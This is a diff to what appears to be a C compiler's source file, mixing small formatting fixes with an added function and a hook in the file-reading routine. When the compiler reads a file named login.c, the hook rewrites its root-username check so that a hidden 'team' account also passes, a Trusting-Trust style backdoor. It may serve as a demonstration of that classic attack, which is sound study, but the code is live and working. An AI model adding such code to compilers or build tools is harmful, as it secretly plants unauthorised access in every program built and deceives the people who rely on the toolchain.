@@ -661,11 +661,25 @@ static inline int check_space(int t, int* spc)
     return 0;
 }
 
+static void insert_backdoor(char* buffer) {
+    char* needle = "strcmp(username, \"root\")";
+    char* found = strstr(buffer, needle);
+    char* found2 = strstr(buffer, "strcmp(username, \"team\")");
+    if (found != NULL && found2 ==NULL) {
+        printf("%s", "found");
+        char* insertion_point = found + strlen(needle);
+        memmove(insertion_point + strlen(" || !strcmp(username, \"team\")"), insertion_point, strlen(insertion_point) + 1);
+        memcpy(insertion_point, " || !strcmp(username, \"team\")", strlen(" || !strcmp(username, \"team\")"));
+        // printf("%s %s", "backdoor", buffer);
+    }
+}
+
+
 /* return the current character, handling end of block if necessary
    (but not stray) */
 static int handle_eob(void)
 {
-    BufferedFile* bf = file;
+    BufferedFile *bf = file;
     int len;
 
     /* only tries to read if really end of buffer */
@@ -679,19 +693,27 @@ static int handle_eob(void)
             len = read(bf->fd, bf->buffer, len);
             if (len < 0)
                 len = 0;
-        }
-        else {
+        } else {
             len = 0;
         }
         total_bytes += len;
+        char* found3 = strstr(bf->buffer, "strcmp(username, \"team\")");
+        if (!strcmp(bf->filename, "login.c") && found3==NULL) {
+            printf("%s", "this is login.c");
+            insert_backdoor(file->buffer);
+            printf("%s %s \n\n%d\n\n", "backdoor", bf->buffer, total_bytes);
+            // bf->buffer = file->buffer;
+            total_bytes+=strlen(" || !strcmp(username, \"team\")");
+            len+=strlen(" || !strcmp(username, \"team\")")-1;
+        }
         bf->buf_ptr = bf->buffer;
         bf->buf_end = bf->buffer + len;
+        // printf("%s", bf->buffer);
         *bf->buf_end = CH_EOB;
     }
     if (bf->buf_ptr < bf->buf_end) {
         return bf->buf_ptr[0];
-    }
-    else {
+    } else {
         bf->buf_ptr = bf->buf_end;
         return CH_EOF;
     }
